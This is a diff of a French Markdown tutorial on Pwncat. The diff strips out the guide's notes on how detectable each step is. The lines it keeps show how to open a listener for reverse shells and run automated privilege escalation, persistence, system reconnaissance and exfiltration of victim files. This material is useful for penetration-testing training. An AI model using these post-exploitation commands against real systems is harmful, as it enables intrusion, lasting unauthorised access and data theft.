@@ -32,7 +32,6 @@ pwncat -l 4444
 
 **Explication :** Cette commande configure Pwncat pour écouter sur le port 4444 pour une connexion entrante.&#x20;
 
-**Discrétion :** Moyenne. Écouter sur un port peut être détecté si les scans de ports sont effectués sur le réseau.
 
 **Utilisation de Pwncat pour la Gestion de Session**
 
@@ -40,7 +39,7 @@ pwncat -l 4444
 
 Une fois qu'une session reverse shell est établie, Pwncat fournit une série de commandes internes pour améliorer l'interaction, telles que la persistance, l'escalade de privilèges automatisée, et la gestion des modules.
 
-#### Options Avancées et Discrétion
+#### Options Avancées
 
 **Automatisation des Tâches**
 
@@ -52,7 +51,6 @@ pwncat$ run escalate
 
 **Explication :** Exécute des routines automatisées pour tenter d'escalader les privilèges sur la machine distante.&#x20;
 
-**Discrétion :** Variable. Selon les techniques utilisées, cela peut être plus ou moins détectable par des solutions de sécurité.
 
 **Gestion des Modules**
 
@@ -64,9 +62,8 @@ pwncat$ load my_custom_module
 
 **Explication :** Charge un module personnalisé dans Pwncat pour étendre ses fonctionnalités.&#x20;
 
-**Discrétion :** Moyenne à élevée. Charger des modules pour effectuer des actions spécifiques peut générer des comportements qui pourraient alerter les systèmes de détection.
 
-#### Exemples de Scénarios et Discrétion
+#### Exemples de Scénarios
 
 **Session de post-exploitation**
 
@@ -78,7 +75,6 @@ pwncat$ persist
 
 **Explication :** Installe divers mécanismes de persistance pour maintenir l'accès au système compromis.&#x20;
 
-**Discrétion :** Élevée. La persistance implique souvent de modifier des fichiers de configuration ou d'installer des services, ce qui peut être surveillé.
 
 **Collecte d'informations**
 
@@ -88,7 +84,6 @@ pwncat$ run collect
 
 **Explication :** Collecte des informations détaillées sur le système compromis.&#x20;
 
-**Discrétion :** Moyenne. Collecter des données peut générer du trafic et des charges sur le système qui pourraient être notés par des administrateurs.
 
 **Exfiltration de données**
 
@@ -100,7 +95,6 @@ pwncat$ download /path/to/important/data
 
 **Explication :** Transfère des fichiers de la victime à l'attaquant de manière sécurisée.&#x20;
 
-**Discrétion :** Moyenne à élevée. L'exfiltration de données peut être détectée en fonction du volume et de la méthode de transfert.
 
 #### Bonnes Pratiques
 
